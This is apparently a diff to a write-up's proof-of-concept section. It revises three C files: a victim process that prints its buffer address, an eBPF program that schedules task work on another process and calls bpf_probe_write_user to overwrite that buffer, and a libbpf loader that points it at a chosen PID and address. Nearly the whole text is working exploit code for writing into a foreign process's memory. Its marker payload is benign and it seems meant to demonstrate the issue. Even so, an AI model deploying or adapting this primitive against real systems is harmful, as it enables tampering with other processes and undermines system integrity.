@@ -84,41 +84,46 @@ mkdir -p poc
 ### `poc/victim.c`
  
 ```c
+cat > poc/victim.c <<'EOF'
 #define _GNU_SOURCE
 #include <stdio.h>
-#include <unistd.h>
 #include <string.h>
+#include <unistd.h>
 #include <sys/mman.h>
- 
+
 int main(void) {
     char *buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-    if (buf == MAP_FAILED) return 1;
- 
-    memset(buf, 'A', 16);
-    buf[16] = 0;
- 
-    printf("PID=%d\n", getpid());
-    printf("ADDR=%p\n", buf);
+    if (buf == MAP_FAILED) { perror("mmap"); return 1; }
+
+    memset(buf, 'A', 32);
+    buf[32] = 0;
+
+    printf("PID=%d\nADDR=%p\n", getpid(), buf);
     fflush(stdout);
- 
+
     for (;;) {
         printf("BUF=%.16s\n", buf);
         fflush(stdout);
         sleep(1);
     }
 }
+EOF
+
 ```
  
 ### `poc/tw_write.bpf.c`
  
 ```c
+cat > poc/tw_write.bpf.c <<'EOF'
 #include "vmlinux.h"
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_tracing.h>
- 
+
+char LICENSE[] SEC("license") = "GPL";
+
 #define MARKER_LEN 5
- 
+
 struct work_value {
     struct bpf_task_work tw;
     __u32 target_pid;
@@ -129,76 +134,84 @@ struct work_value {
     __u32 ran;
     __s32 err;
 };
- 
+
 struct {
     __uint(type, BPF_MAP_TYPE_ARRAY);
     __uint(max_entries, 1);
     __type(key, __u32);
     __type(value, struct work_value);
 } task_work_map SEC(".maps");
- 
+
 extern struct task_struct *bpf_task_from_pid(s32 pid) __ksym;
 extern void bpf_task_release(struct task_struct *task) __ksym;
-extern int bpf_task_work_schedule_signal(
-    struct task_struct *task,
-    struct bpf_task_work *tw,
-    void *map__map,
-    int (*callback)(struct bpf_map *map, void *key, void *value)
-) __ksym;
- 
-static int task_work_cb(struct bpf_map *map, void *key, void *value) {
+extern int bpf_task_work_schedule_signal(struct task_struct *task,
+                                         struct bpf_task_work *tw,
+                                         void *map__map,
+                                         int (*callback)(struct bpf_map *map,
+                                                         void *key,
+                                                         void *value)) __ksym;
+
+static int task_work_cb(struct bpf_map *map, void *key, void *value)
+{
     struct work_value *v = value;
     int ret;
- 
+
     if (!v || !v->target_addr)
         return 0;
- 
-    ret = bpf_probe_write_user((void *)(long)v->target_addr, v->marker, MARKER_LEN);
+
+    ret = bpf_probe_write_user((void *)(long)v->target_addr,
+                               v->marker, MARKER_LEN);
     v->err = ret;
     v->ran++;
     return 0;
 }
- 
-SEC("tp_btf/sys_enter")
-int BPF_PROG(on_getpid, struct pt_regs *regs, long id) {
+
+SEC("fentry/__x64_sys_getpid")
+int BPF_PROG(on_getpid, const struct pt_regs *regs)
+{
     __u32 key = 0;
     struct work_value *v;
     struct task_struct *task;
     int ret;
- 
+
     v = bpf_map_lookup_elem(&task_work_map, &key);
-    if (!v || !v->target_pid)
+    if (!v || !v->target_pid || !v->target_addr)
         return 0;
- 
+
     task = bpf_task_from_pid(v->target_pid);
-    if (!task)
+    if (!task) {
+        v->err = -1;
         return 0;
- 
-    ret = bpf_task_work_schedule_signal(task, &v->tw, &task_work_map, task_work_cb);
+    }
+
+    ret = bpf_task_work_schedule_signal(task, &v->tw,
+                                        &task_work_map, task_work_cb);
     v->err = ret;
     if (!ret)
         v->scheduled++;
- 
+
     bpf_task_release(task);
     return 0;
 }
- 
-char LICENSE[] SEC("license") = "GPL";
+EOF
 ```
  
 ### `poc/tw_write_user.c`
  
 ```c
-#include <stdio.h>
-#include <stdlib.h>
-#include <stdint.h>
-#include <string.h>
-#include <stdarg.h>
-#include <unistd.h>
+cat > poc/tw_write_user.c <<'EOF'
 #include <bpf/libbpf.h>
 #include <bpf/bpf.h>
+#include <errno.h>
+#include <stdarg.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/resource.h>
+#include <unistd.h>
 #include "tw_write.skel.h"
- 
+
 struct work_value_user {
     uint64_t tw_opaque;
     uint32_t target_pid;
@@ -210,70 +223,71 @@ struct work_value_user {
     uint32_t ran;
     int32_t err;
 };
- 
-static int libbpf_print_fn(enum libbpf_print_level level, const char *fmt, va_list args) {
+
+static int libbpf_print(enum libbpf_print_level level, const char *fmt, va_list args)
+{
     return vfprintf(stderr, fmt, args);
 }
- 
-int main(int argc, char **argv) {
+
+int main(int argc, char **argv)
+{
     struct tw_write_bpf *skel;
-    struct work_value_user v = {}, cur = {};
+    struct work_value_user v = {}, out = {};
+    struct rlimit rl = {RLIM_INFINITY, RLIM_INFINITY};
     uint32_t key = 0;
     int map_fd, err;
- 
+
     if (argc != 3) {
-        fprintf(stderr, "usage: %s <pid> <addr>\n", argv[0]);
+        fprintf(stderr, "usage: %s <victim-pid> <victim-addr>\n", argv[0]);
         return 1;
     }
- 
-    libbpf_set_print(libbpf_print_fn);
- 
-    v.target_pid = atoi(argv[1]);
+
+    v.target_pid = strtoul(argv[1], NULL, 0);
     v.target_addr = strtoull(argv[2], NULL, 0);
     memcpy(v.marker, "BPFOK", 5);
     v.marker_len = 5;
- 
-    skel = tw_write_bpf__open();
+
+    libbpf_set_print(libbpf_print);
+    setrlimit(RLIMIT_MEMLOCK, &rl);
+
+    skel = tw_write_bpf__open_and_load();
     if (!skel) {
-        fprintf(stderr, "open failed\n");
-        return 1;
-    }
- 
-    err = tw_write_bpf__load(skel);
-    if (err) {
         fprintf(stderr, "open/load failed\n");
         return 1;
     }
- 
+
     map_fd = bpf_map__fd(skel->maps.task_work_map);
     err = bpf_map_update_elem(map_fd, &key, &v, BPF_ANY);
     if (err) {
-        perror("map update");
+        perror("bpf_map_update_elem");
         return 1;
     }
- 
+
     err = tw_write_bpf__attach(skel);
     if (err) {
         fprintf(stderr, "attach failed: %d\n", err);
         return 1;
     }
- 
+
     printf("loader pid=%d target pid=%u target addr=0x%llx\n",
            getpid(), v.target_pid, (unsigned long long)v.target_addr);
- 
-    for (int i = 0; i < 200000; i++) {
+
+    for (int i = 0; i < 10; i++) {
         getpid();
-        bpf_map_lookup_elem(map_fd, &key, &cur);
-        if (cur.ran)
-            break;
+        sleep(1);
+        if (!bpf_map_lookup_elem(map_fd, &key, &out)) {
+            printf("scheduled=%u ran=%u err=%d\n",
+                   out.scheduled, out.ran, out.err);
+            if (out.ran)
+                break;
+        }
     }
- 
-    bpf_map_lookup_elem(map_fd, &key, &cur);
-    printf("scheduled=%u ran=%u err=%d\n", cur.scheduled, cur.ran, cur.err);
- 
+
     tw_write_bpf__destroy(skel);
     return 0;
 }
+EOF
+
 ```
  
 ---
